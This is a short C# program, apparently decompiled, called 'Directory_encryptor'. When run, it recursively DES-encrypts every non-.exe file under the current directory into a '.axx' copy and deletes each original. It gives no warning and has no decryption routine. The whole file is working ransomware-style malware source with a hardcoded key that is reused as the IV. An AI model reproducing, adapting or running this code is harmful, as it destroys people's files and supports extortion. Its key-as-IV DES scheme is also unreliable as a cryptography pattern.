using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Directory_encryptor;

internal class Program
{
	private static void Main(string[] args)
	{
		EncryptDir(new DirectoryInfo(Directory.GetCurrentDirectory()), 1);
	}

	private static void EncryptFile(string sInputFilename, string sOutputFilename, string sKey)
	{
		FileStream fileStream = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
		FileStream fileStream2 = new FileStream(sOutputFilename, FileMode.Create, FileAccess.Write);
		ICryptoTransform transform = new DESCryptoServiceProvider
		{
			Key = Encoding.ASCII.GetBytes(sKey),
			IV = Encoding.ASCII.GetBytes(sKey)
		}.CreateEncryptor();
		CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		cryptoStream.Write(array, 0, array.Length);
		cryptoStream.Close();
		fileStream.Close();
		fileStream2.Close();
	}

	private static void EncryptDir(DirectoryInfo d, int mili)
	{
		FileInfo[] files = d.GetFiles();
		foreach (FileInfo fileInfo in files)
		{
			if (fileInfo.Extension.ToLower() != ".exe")
			{
				string sKey = "R?\n??i??";
				EncryptFile(fileInfo.FullName, fileInfo.FullName + ".axx", sKey);
				File.Delete(fileInfo.FullName);
				Thread.Sleep(mili);
			}
		}
		DirectoryInfo[] directories = d.GetDirectories();
		for (int i = 0; i < directories.Length; i++)
		{
			EncryptDir(directories[i], 1);
		}
	}
}
